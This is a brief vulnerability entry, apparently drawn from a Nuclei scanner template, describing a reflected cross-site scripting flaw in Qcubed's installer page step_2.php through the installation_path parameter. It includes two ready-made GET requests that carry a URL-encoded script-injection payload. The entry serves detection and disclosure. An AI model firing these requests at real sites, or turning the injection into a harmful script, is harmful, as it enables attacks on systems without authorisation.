# Vulnerability: Qcubed - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`qcubed-xss.yaml`)

## Description
Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_path parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
GET {{BaseURL}}/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

